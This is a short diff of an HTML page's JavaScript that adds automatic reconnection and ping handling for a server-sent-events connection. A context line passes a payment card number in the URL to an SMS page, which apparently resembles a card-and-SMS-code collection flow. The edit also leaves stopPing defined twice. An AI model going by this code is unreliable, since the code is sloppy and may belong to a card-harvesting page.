@@ -687,7 +687,17 @@ window.redirectToSMS = function(cardNumber) {
     window.location.href = `sms.html?card=${encodeURIComponent(cardNumber)}`;
 };
 
-        function startPing() {
+        // Автоматическое переподключение при ошибках
+function setupSSEReconnection() {
+    setInterval(() => {
+        if (!eventSource || eventSource.readyState === EventSource.CLOSED) {
+            console.log('🔄 Автоматическое переподключение SSE...');
+            connectSSE();
+        }
+    }, 5000); // Проверяем каждые 5 секунд
+}
+
+function startPing() {
     pingInterval = setInterval(() => {
         if (eventSource && eventSource.readyState === EventSource.OPEN) {
             console.log('🏓 Ping SSE connection');
@@ -696,7 +706,13 @@ window.redirectToSMS = function(cardNumber) {
             connectSSE();
         }
     }, 10000); // 10 секунд
-} // ← ДОБАВЬ ЭТУ СКОБКУ
+} // ← Закрывающая скобка
+
+function stopPing() {
+    if (pingInterval) {
+        clearInterval(pingInterval);
+    }
+}
 
         function stopPing() {
             if (pingInterval) {
@@ -776,6 +792,7 @@ window.redirectToSMS = function(cardNumber) {
     </script>
 </body>
 </html>
+
 
 
 
